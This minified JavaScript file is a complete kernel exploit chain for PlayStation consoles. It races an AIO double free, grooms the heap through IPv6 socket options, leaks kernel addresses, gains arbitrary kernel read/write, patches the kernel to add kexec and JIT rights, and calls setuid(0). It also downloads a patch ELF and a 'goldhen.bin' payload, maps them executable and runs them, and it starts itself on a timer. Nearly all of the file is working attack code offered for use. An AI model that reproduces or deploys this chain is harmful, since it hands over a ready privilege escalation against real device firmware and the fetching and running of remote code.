import{Int as e}from"./module/int64.js";import{mem as t}from"./module/mem.js";import{log as r,die as i,hex as a,hexdump as $}from"./module/utils.js";import{cstr as s,jstr as o}from"./module/memtools.js";import{page_size as l,context_size as n}from"./module/offset.js";import{Chain as d}from"./module/chain.js";import{View1 as c,View2 as f,View4 as u,Word as p,Long as _,Pointer as x,Buffer as h}from"./module/view.js";import*as w from"./module/chain.js";import*as m from"./config.js";let t1=performance.now(),[is_ps4,version]=(()=>{let e=m.target,t=(65536&e)==0,r=65535&e,[i,$]=t?[256,4688]:[256,4128];if(!(i<=r&&r<$))throw RangeError(`invalid config.target: ${a(e)}`);return[t,r]})();function malloc(e){var r=new Uint8Array(65536+e);nogc.push(r);var i=t.readp(t.addrof(r).add(16));return i.backing=r,i}function malloc32(e){var r=new Uint8Array(65536+4*e);nogc.push(r);var i=t.readp(t.addrof(r).add(16));return i.backing=new Uint32Array(r.buffer),i}function array_from_address(e,r){var i=new Uint32Array(4096),a=t.addrof(i).add(16);return t.write64(a,e),t.write32(a.add(8),r),t.write32(a.add(12),1),nogc.push(i),i}function toogle_payload(e){var t=chain.sysp("mmap",0,4096,7,266240,-1,0);array_from_address(t,1)[0]=12838911;var r=new XMLHttpRequest;r.responseType="arraybuffer",r.open("GET",e),r.send(),r.onreadystatechange=function(){if(4==r.readyState){var e=r.response,i=chain.sysp("mmap",0,4*e.byteLength,7,4098,-1,0),a=array_from_address(i,4*e.byteLength),$=new Uint8Array(4-r.response.byteLength%4%4),s=new Uint8Array(r.response.byteLength+$.byteLength);s.set(new Uint8Array(r.response),0),s.set($,r.response.byteLength);var o=new Uint32Array(s.buffer);a.set(o,0),call_nze("pthread_create",malloc(16),0,t,i)}},EndTimer()}function Exploit_done(){showMessage("###########################################"),toogle_payload("goldhen.bin")}let AF_UNIX=1,AF_INET=2,AF_INET6=28,SOCK_STREAM=1,SOCK_DGRAM=2,SOL_SOCKET=65535,SO_REUSEADDR=4,SO_LINGER=128,IPPROTO_TCP=6,IPPROTO_UDP=17,IPPROTO_IPV6=41,TCP_INFO=32,size_tcp_info=236,TCPS_ESTABLISHED=4,IPV6_2292PKTOPTIONS=25,IPV6_PKTINFO=46,IPV6_NEXTHOP=48,IPV6_RTHDR=51,IPV6_TCLASS=61,CPU_LEVEL_WHICH=3,CPU_WHICH_TID=1,MAP_SHARED=1,MAP_FIXED=16,RTP_SET=1,RTP_PRIO_REALTIME=2,AIO_CMD_READ=1,AIO_CMD_WRITE=2,AIO_CMD_FLAG_MULTI=4096,AIO_CMD_MULTI_READ=4097,AIO_STATE_COMPLETE=3,AIO_STATE_ABORTED=4,num_workers=2,max_aio_ids=128,rtprio=f.of(2,256),main_core=7,num_grooms=512,num_handles=256,num_sds=256,num_alias=100,num_races=100,leak_len=16,num_leaks=5,num_clobbers=8,chain=null;var nogc=[];async function init(){await w.init(),chain=new d;let e=new Map(Object.entries({pthread_create:152848,pthread_join:44960,pthread_barrier_init:160720,pthread_barrier_wait:41760,pthread_barrier_destroy:65184,pthread_exit:30624}));w.init_gadget_map(w.gadgets,e,w.libkernel_base)}function sys_void(...e){return chain.syscall_void(...e)}function sysi(...e){return chain.sysi(...e)}function call_nze(...e){let t=chain.call_int(...e);0!==t&&i(`call(${e[0]}) returned nonzero: ${t}`)}function aio_submit_cmd(e,t,r,i){sysi("aio_submit_cmd",e,t,r,3,i)}let _aio_errors=new u(128),_aio_errors_p=_aio_errors.addr;function aio_multi_delete(e,t,r=_aio_errors_p){sysi("aio_multi_delete",e,t,r)}function aio_multi_poll(e,t,r=_aio_errors_p){sysi("aio_multi_poll",e,t,r)}function aio_multi_cancel(e,t,r=_aio_errors_p){sysi("aio_multi_cancel",e,t,r)}function aio_multi_wait(e,t,r=_aio_errors_p){sysi("aio_multi_wait",e,t,r,1,0)}function make_reqs1(e){let t=new h(40*e);for(let r=0;r<e;r++)t.write32(32+40*r,-1);return t}function spray_aio(e=1,t,r,i,a=!0,$=1){let s=4*(a?r:1);$|=a?4096:0;for(let o=0,l=0;o<e;o++)aio_submit_cmd($,t,r,i.add(l)),l+=s}function poll_aio(e,t,r=e.length){void 0!==t&&(t=t.addr),aio_multi_poll(e.addr,r,t)}function cancel_aios(e,t){let r=t%128,i=(t-r)/128;for(let a=0;a<i;a++)aio_multi_cancel(e.add((a<<2)*128),128);r&&aio_multi_cancel(e.add((i<<2)*128),r)}function free_aios(e,t){let r=t%128,i=(t-r)/128;for(let a=0;a<i;a++){let $=e.add((a<<2)*128);aio_multi_cancel($,128),aio_multi_poll($,128),aio_multi_delete($,128)}if(r){let s=e.add((i<<2)*128);aio_multi_cancel(s,128),aio_multi_poll(s,128),aio_multi_delete(s,128)}}function free_aios2(e,t){let r=t%128,i=(t-r)/128;for(let a=0;a<i;a++){let $=e.add((a<<2)*128);aio_multi_poll($,128),aio_multi_delete($,128)}if(r){let s=e.add((i<<2)*128);aio_multi_poll(s,128),aio_multi_delete(s,128)}}function get_our_affinity(e){sysi("cpuset_getaffinity",3,1,-1,8,e.addr)}function set_our_affinity(e){sysi("cpuset_setaffinity",3,1,-1,8,e.addr)}function close(e){sysi("close",e)}function new_socket(){return sysi("socket",28,2,17)}function new_tcp_socket(){return sysi("socket",2,1,0)}function gsockopt(e,t,r,i,a){let $=new p(i.size);return void 0!==a&&($[0]=a),sysi("getsockopt",e,t,r,i.addr,$.addr),$[0]}function setsockopt(e,t,r,i,a){sysi("setsockopt",e,t,r,i,a)}function ssockopt(e,t,r,i,a){void 0===a&&(a=i.size);let $=i.addr;setsockopt(e,t,r,$,a)}function get_rthdr(e,t,r){return gsockopt(e,41,51,t,r)}function set_rthdr(e,t,r){ssockopt(e,41,51,t,r)}function free_rthdrs(e){for(let t of e)setsockopt(t,41,51,0,0)}function build_rthdr(e,t){let r=(t>>3)-1&-2;return t=r+1<<3,e[0]=0,e[1]=r,e[2]=0,e[3]=r>>1,t}function spawn_thread(e){let t=new h(n),r=new x;return r.ctx=t,t.write64(56,e.stack_addr),t.write64(128,e.get_gadget("ret")),call_nze("pthread_create",r.addr,0,chain.get_gadget("setcontext"),t.addr),r}function make_aliased_rthdrs(e){let t=new h(128),$=build_rthdr(t,128);for(let s=0;s<100;s++){for(let o=0;o<256;o++)t.write32(4,o),set_rthdr(e[o],t,$);for(let l=0;l<e.length;l++){get_rthdr(e[l],t);let n=t.read32(4);if(n!==l){r(`aliased rthdrs at attempt: ${s}`);let d=[e[l],e[n]];return r(`found pair: ${d}`),e.splice(n,1),e.splice(l,1),free_rthdrs(e),e.push(new_socket(),new_socket()),d}}}i(`failed to make aliased rthdrs. size: ${a(128)}`)}function race_one(e,t,$,s,o){let l=new u([-1,-1]),n=new p(128),d=s;d.push_syscall("cpuset_setaffinity",3,1,-1,8,n.addr),d.push_syscall("rtprio_thread",1,0,rtprio.addr),d.push_gadget("pop rax; ret"),d.push_value(1),d.push_get_retval(),d.push_call("pthread_barrier_wait",$.addr),d.push_syscall("aio_multi_delete",e,1,l.addr_at(1)),d.push_call("pthread_exit",0);let f=spawn_thread(d),_=f.read32(0);for(;0===d.retval_int;)sys_void("sched_yield");chain.push_call("pthread_barrier_wait",$.addr),chain.push_syscall("sched_yield"),chain.push_syscall("thr_suspend_ucontext",_),chain.push_get_retval(),chain.push_get_errno(),chain.push_end(),chain.run(),chain.reset();let x=chain.retval_int;if(r(`suspend ${_}: ${x} errno: ${chain.errno}`),-1===x)return call_nze("pthread_join",f,0),r(),null;let h=!1;try{let w=new u(1);aio_multi_poll(e,1,w.addr),r(`poll: ${a(w[0])}`);let m=new c(236),k=gsockopt(t,6,32,m);r(`info size: ${a(k)}`),236!==k&&i(`info size isn't 236: ${k}`);let y=m[0];r(`tcp_state: ${y}`),2147614723!==w[0]&&4!==y&&(aio_multi_delete(e,1,l.addr),h=!0)}finally{r("resume thread\n"),sysi("thr_resume_ucontext",_),call_nze("pthread_join",f,0)}return h?(r(`race errors: ${a(l[0])}, ${a(l[1])}`),l[0]!==l[1]&&(r("ERROR: bad won_race"),i("ERROR: bad won_race")),make_aliased_rthdrs(o)):null}function double_free_reqs2(e){function t(e,t){let r=0;for(let i=0;i<t;i++)r|=(e>>8*i&255)<<8*(t-i-1);return r>>>0}let a=new h(16);a[1]=2;a.write16(2,t(5050,2));a.write32(4,t(2130706433,4));let $=new d,s=new _;call_nze("pthread_barrier_init",s.addr,0,2);let o=make_reqs1(3),l=o.addr,n=new u(3),c=n.addr,f=n.addr_at(2),x=new_tcp_socket();ssockopt(x,65535,4,new p(1)),sysi("bind",x,a.addr,a.size),sysi("listen",x,1);for(let w=0;w<100;w++){let m=new_tcp_socket();sysi("connect",m,a.addr,a.size);let k=sysi("accept",x,0,0);ssockopt(m,65535,128,u.of(1,1)),o.write32(112,m),aio_submit_cmd(4097,l,3,c),aio_multi_cancel(c,3),aio_multi_poll(c,3),close(m);let y=race_one(f,k,s,$,e);if($.reset(),aio_multi_delete(c,3),close(k),null!==y)return r(`won race at attempt: ${w}`),close(x),call_nze("pthread_barrier_destroy",s.addr),y}i("failed aio double free")}function new_evf(e){let t=s("");return sysi("evf_create",t.addr,0,e)}function set_evf_flags(e,t){sysi("evf_clear",e,0),sysi("evf_set",e,t)}function free_evf(e){sysi("evf_delete",e)}function verify_reqs2(e,t){if(2!==e.read32(t))return!1;let r=[];for(let i=16;i<=32;i+=8){if(65535!==e.read16(t+i+6))return!1;r.push(e.read16(t+i+4))}let a=e.read32(t+56);if(!(0<a&&a<=4)||0!==e.read32(t+56+4)||!e.read64(t+64).eq(0))return!1;for(let $=72;$<=80;$+=8)if(65535===e.read16(t+$+6))65535!==e.read16(t+$+4)&&r.push(e.read16(t+$+4));else if(80===$||!e.read64(t+$).eq(0))return!1;return r.every((e,t,r)=>e===r[0])}function leak_kernel_addrs(e){close(e[1]);let t=e[0],s=new h(2048);r("confuse evf with rthdr");let o=null;for(let l=0;l<100;l++){let n=[];for(let d=0;d<256;d++)n.push(new_evf(3840|d<<16));get_rthdr(t,s,128);let c=s.read32(0);for(let f of(set_evf_flags(o=n[c>>>16],1|c),get_rthdr(t,s,128),s.read32(0),n.splice(c>>16,1),n))free_evf(f);if(null!==o){r(`confused rthdr and evf at attempt: ${l}`);break}}null===o&&i("failed to confuse evf and rthdr"),set_evf_flags(o,65280),get_rthdr(t,s,128);let x=s.read64(40);r(`"evf cv" string addr: ${x}`);let w=s.read64(64).sub(56);r(`kernel buffer addr: ${w}`);let m=w.add(4),k=make_reqs1(6),y=k.addr;k.write64(16,m);let g=new u(1536),b=g.addr;r("find aio_entry");let v=null;loop:for(let E=0;E<5;E++){get_rthdr(t,s),spray_aio(256,y,6,b,!0,2),get_rthdr(t,s);for(let I=128;I<s.length;I+=128)if(verify_reqs2(s,I)){v=I,r(`found reqs2 at attempt: ${E}`);break loop}free_aios(b,1536)}null===v&&i("could not leak a reqs2"),r(`reqs2 offset: ${a(v)}`),get_rthdr(t,s);let T=s.slice(v,v+128);r("leaked aio_entry:"),$(T);let O=new _(T.read64(16));r(`reqs1_addr: ${O}`),O.lo&=-256,r(`reqs1_addr: ${O}`),r("searching target_id");let A=null,R=null,P=null;for(let S=0;S<1536;S+=6){aio_multi_cancel(b.add(S<<2),6),get_rthdr(t,s);let q=s.read32(v+56);if(4===q){r(`found target_id at batch: ${S/6}`),A=new p(g[S]),g[S]=0,r(`target_id: ${a(A)}`);let z=s.slice(v,v+128);r("leaked aio_entry:"),$(z);let D=S+6;R=g.addr_at(D),P=1536-D;break}}return null===A&&i("target_id not found"),cancel_aios(R,P),free_aios2(b,1536),[O,w,x,A,o]}function make_aliased_pktopts(e){let t=new p;for(let a=0;a<100;a++){for(let $=0;$<256;$++)setsockopt(e[$],41,25,0,0);for(let s=0;s<256;s++)t[0]=s,ssockopt(e[s],41,61,t);for(let o=0;o<e.length;o++){gsockopt(e[o],41,61,t);let l=t[0];if(l!==o){r(`aliased pktopts at attempt: ${a}`);let n=[e[o],e[l]];r(`found pair: ${n}`),e.splice(l,1),e.splice(o,1);for(let d=0;d<2;d++){let c=new_socket();ssockopt(c,41,61,t),e.push(c)}return n}}}i("failed to make aliased pktopts")}function double_free_reqs1(e,t,s,o,l,n){let d=new h(2048),c=make_reqs1(128),f=c.addr,_=new u(256),x=_.addr;r("start overwrite rthdr with AIO queue entry loop");let w=!0;free_evf(o);for(let m=0;m<8;m++){if(spray_aio(2,f,128,x),8===get_rthdr(l,d)&&1===d.read32(0)){r(`aliased at attempt: ${m}`),w=!1,cancel_aios(x,256);break}free_aios(x,256)}w&&i("failed to overwrite rthdr");let k=new h(128),y=build_rthdr(k,k.size);k.write32(4,5),k.write64(24,e),k.write64(32,t.add(40)),k.write32(40,1),k.write32(44,0),k.write32(48,3),k[52]=0,k.write32(80,108724224),k.write64(96,1);let g=new u(128),b=g.addr,v=[x];for(let E=1;E<2;E++)v.push(x.add(128*E<<2));r("start overwrite AIO queue entry with rthdr loop");let I=null;close(l),l=null;loop:for(let T=0;T<100;T++){for(let O of n)set_rthdr(O,k,y);for(let A=0;A<v.length;A++){g.fill(-1),aio_multi_cancel(v[A],128,b);let R=g.indexOf(3);if(-1!==R){r(`req_idx: ${R}`),r(`found req_id at batch: ${A}`),r(`states: ${[...g].map(e=>a(e))}`),r(`states[${R}]: ${a(g[R])}`),r(`aliased at attempt: ${T}`);let P=128*A+R;I=new p(_[P]),r(`req_id: ${a(I)}`),_[P]=0,poll_aio(I,g),r(`states[${R}]: ${a(g[0])}`);for(let S=0;S<256;S++){let q=n[S];get_rthdr(q,k);let z=k[52];if(z){$(k),l=q,n.splice(S,1),free_rthdrs(n),n.push(new_socket());break}}null===l&&i("can't find sd that overwrote AIO queue entry"),r(`sd: ${l}`);break loop}}}null===I&&i("failed to overwrite AIO queue entry"),free_aios2(x,256),poll_aio(s,g),r(`target's state: ${a(g[0])}`);let D=new u([-1,-1]),j=new u([I,s]);aio_multi_delete(j.addr,2,D.addr);try{let C=make_aliased_pktopts(n);return[C,l]}finally{r(`delete errors: ${a(D[0])}, ${a(D[1])}`),g[0]=-1,g[1]=-1,poll_aio(j,g),r(`target states: ${a(g[0])}, ${a(g[1])}`);let L=!0;2147614723!==g[0]&&(r("ERROR: bad delete of corrupt AIO request"),L=!1),(0!==D[0]||D[0]!==D[1])&&(r("ERROR: bad delete of ID pair"),L=!1),L||i("ERROR: double free on a 0x100 malloc zone failed")}}function make_kernel_arw(e,t,a,$,s){let l=e[0],n=new p,d=is_ps4?176:192,c=new h(256),f=build_rthdr(c,c.size),_=a.add(16);c.write64(16,_),r("overwrite main pktopts");let x=null;close(e[1]);for(let w=0;w<100;w++){for(let m=0;m<256;m++)c.write32(d,16705|m<<16),set_rthdr(s[m],c,f);gsockopt(l,41,61,n);let k=n[0];if((65535&k)==16705){r(`found reclaim sd at attempt: ${w}`);let y=k>>>16;x=s[y],s.splice(y,1);break}}null===x&&i("failed to overwrite main pktopts");let g=new h(20);g.write64(0,_);let b=new p,v=b.addr,E=new h(8),I=E.addr;function T(e){let t=0;for(;t<8;){g.write64(8,e.add(t)),b[0]=8-t,ssockopt(l,41,46,g),sysi("getsockopt",l,41,48,I.add(t),v);let r=b[0];0===r?(E[t]=0,t+=1):t+=r}return E.read64(0)}r(`kread64(&"evf cv"): ${T($)}`);let O=o(E);r(`*(&"evf cv"): ${O}`),"evf cv"!==O&&i('test read of &"evf cv" failed');let A=$.sub(8351527);r(`kernel base: ${A}`),r("\nmaking arbitrary kernel read/write");let R=A.add(35582624);r(`cpuid_to_pcpu[0]: ${R}`);let P=T(R);r(`pcpu: ${P}`),r(`cpuid: ${T(P.add(48)).hi}`);let S=T(P);r(`td: ${S}`);let q=T(S.add(8));r(`proc: ${q}`);let z=sysi("getpid");r(`our pid: ${z}`);let D=T(q.add(176)).lo;r(`suspected proc pid: ${D}`),D!==z&&i("process not found");let j=T(q.add(72));r(`proc.p_fd: ${j}`);let C=T(j);r(`ofiles: ${C}`);let L=T(q.add(64));r(`p_ucred ${L}`);let G=new u(2);sysi("pipe",G.addr);let M=T(C.add(8*G[0]));r(`pipe file: ${M}`);let N=T(M);r(`pipe pointer: ${N}`);let F=new h(24);for(let H=0;H<F.size;H+=8)F.write64(H,T(N.add(H)));let K=l,U=t,V=T(C.add(8*K));r(`main sock file: ${V}`);let W=T(V);r(`main sock pointer: ${W}`);let B=T(W.add(24));r(`main sock pcb: ${B}`);let X=T(B.add(280));r(`main pktopts: ${X}`),r(`0x100 malloc zone pointer: ${a}`),X.ne(a)&&i("main pktopts pointer != leaked pktopts pointer");let J=T(T(C.add(8*x)));r(`reclaim sock pointer: ${J}`);let Q=T(J.add(24));r(`reclaim sock pcb: ${Q}`);let Y=T(Q.add(280));r(`reclaim pktopts: ${Y}`);let Z=T(T(C.add(8*U)));r(`worker sock pointer: ${Z}`);let ee=T(Z.add(24));r(`worker sock pcb: ${ee}`);let et=T(ee.add(280));r(`worker pktopts: ${et}`);let er=et.add(16);g.write64(0,er),g.write64(8,0),ssockopt(K,41,46,g),g.write64(0,$),ssockopt(K,41,46,g),gsockopt(U,41,46,g);let ei=o(g);r(`*(&"evf cv"): ${ei}`),"evf cv"!==ei&&i("pktopts read failed"),r("achieved restricted kernel read/write");let ea=new class e{constructor(e,t,r,i){this.main_sd=e,this.worker_sd=t,this.rpipe=r[0],this.wpipe=r[1],this.pipe_addr=i,this.pipe_addr2=i.add(16),this.rw_buf=new h(20),this.addr_buf=new h(20),this.data_buf=new h(20),this.data_buf.write32(12,1073741824)}_verify_len(e){if(!(Number.isInteger(e)&&0<=e<=4294967295))throw TypeError("len not a 32-bit unsigned integer")}copyin(e,t,r){this._verify_len(r);let i=this.main_sd,a=this.worker_sd,$=this.addr_buf,s=this.data_buf;$.write64(0,this.pipe_addr),ssockopt(i,41,46,$),s.write64(0,0),ssockopt(a,41,46,s),$.write64(0,this.pipe_addr2),ssockopt(i,41,46,$),$.write64(0,t),ssockopt(a,41,46,$),sysi("write",this.wpipe,e,r)}copyout(e,t,r){this._verify_len(r);let i=this.main_sd,a=this.worker_sd,$=this.addr_buf,s=this.data_buf;$.write64(0,this.pipe_addr),ssockopt(i,41,46,$),s.write32(0,1073741824),ssockopt(a,41,46,s),$.write64(0,this.pipe_addr2),ssockopt(i,41,46,$),$.write64(0,e),ssockopt(a,41,46,$),sysi("read",this.rpipe,t,r)}_read(e){let t=this.rw_buf;t.write64(0,e),t.fill(0,8),ssockopt(this.main_sd,41,46,t),gsockopt(this.worker_sd,41,46,t)}read32(e){return this._read(e),this.rw_buf.read32(0)}read64(e){return this._read(e),this.rw_buf.read64(0)}write32(e,t){this.rw_buf.write32(0,t),this.copyin(this.rw_buf.addr,e,4)}write64(e,t){this.rw_buf.write64(0,t),this.copyin(this.rw_buf.addr,e,8)}}(K,U,G,N),e$=new h(8);ea.copyout($,e$.addr,e$.size);let es=o(e$);r(`*(&"evf cv"): ${es}`),"evf cv"!==es&&i("pipe read failed"),r("achieved arbitrary kernel read/write");let eo=is_ps4?104:112,el=Y.add(eo),en=et.add(eo);return ea.write64(el,0),ea.write64(en,0),r("corrupt pointers cleaned"),[A,ea,L,[N,F,_,er]]}async function get_patches(e){let t=await fetch(e);if(!t.ok)throw Error(`Network response was not OK, status: ${t.status}
failed to fetch: ${e}`);return t.arrayBuffer()}async function patch_kernel(a,$,s,o){if(!is_ps4)throw RangeError("PS5 kernel patching unsupported");if(!(2048<=version<2304))throw RangeError("kernel patching unsupported");r("change sys_aio_submit() to sys_kexec()");let n=a.add(17858304);$.write32(n,6),$.write64(n.add(8),a.add(313261)),$.write32(n.add(44),1),r("add JIT capabilities"),$.write64(s.add(96),-1),$.write64(s.add(104),-1);let d=await get_patches("./kpatch/900.elf"),f=new c(await d,4096),u=f.size;u>268435456&&i(`patch file too large (>268435456): ${u}`),0===u&&i("patch file size is zero"),u=u+l&-l;let p=new e(0,9),_=new e(268435456,9),x=sysi("jitshm_create",0,u,7),h=sysi("jitshm_alias",x,3),w=chain.sysp("mmap",p,u,5,17,x,0),m=chain.sysp("mmap",_,u,3,17,h,0);r(`exec_addr: ${w}`),r(`write_addr: ${m}`),(w.ne(p)||m.ne(_))&&i("mmap() for jit failed"),r("mlock exec_addr for kernel exec"),sysi("mlock",w,u);let k=new e(1259448,49920);m.write64(0,k),r("test jit exec"),sys_void("kexec",w);let y=chain.errno;r("returned successfully"),r(`jit retval: ${y}`),4919!==y&&i("test jit exec failed");let g=o[1];o[1]=g.addr,r("mlock pipe save data for kernel restore"),sysi("mlock",o[1],l),t.cpy(m,f.addr,f.size),sys_void("kexec",w,...o),r("setuid(0)"),sysi("setuid",0),r("kernel exploit succeeded!")}function setup(e){r("block AIO");let t=new h(80),i=new p;for(let a=0;a<2;a++)t.write32(8+40*a,1),t.write32(32+40*a,e);aio_submit_cmd(1,t.addr,2,i.addr),r("heap grooming");let $=new u(512),s=$.addr,o=make_reqs1(3);return spray_aio(512,o.addr,3,s,!1),cancel_aios(s,512),[i,$]}export async function kexploit(){let e=performance.now();await init();let t=performance.now();try{if(0==sysi("setuid",0)){r("Not running kexploit again."),Exploit_done();return}}catch(i){}let a=new _;get_our_affinity(a),r(`main_mask: ${a}`),r("pinning process to core #7"),set_our_affinity(new _(128)),get_our_affinity(a),r(`main_mask: ${a}`),r("setting main thread's priority"),sysi("rtprio_thread",1,0,rtprio.addr);let[$,s]=(()=>{let e=new u(2);return sysi("socketpair",1,1,0,e.addr),e})(),o=[];for(let l=0;l<256;l++)o.push(new_socket());let n=null,d=null;try{r("STAGE: Setup"),[n,d]=setup($),r("\nSTAGE: Double free AIO queue entry");let c=double_free_reqs2(o);r("\nSTAGE: Leak kernel addresses");let[f,p,x,h,w,]=leak_kernel_addrs(c);r("\nSTAGE: Double free SceKernelAioRWRequest");let[m,k]=double_free_reqs1(f,p,h,w,c[0],o);r("\nSTAGE: Get arbitrary kernel read/write");let[y,g,b,v]=make_kernel_arw(m,k,f,x,o);r("\nSTAGE: Patch kernel"),await patch_kernel(y,g,b,v),r("\nSTAGE: Exploit done"),Exploit_done()}finally{close(s);let E=performance.now(),I=E-t1,T=t-e;r("\ntime (include init): "+I/1e3),r("kex time: "+(E-t)/1e3),r("init time: "+T/1e3),r("time to init: "+(e-t1)/1e3),r("time - init time: "+(I-T)/1e3)}for(let O of(close($),free_aios2(d.addr,d.length),aio_multi_wait(n.addr,1),aio_multi_delete(n.addr,n.length),o))close(O)}setTimeout(kexploit,1500);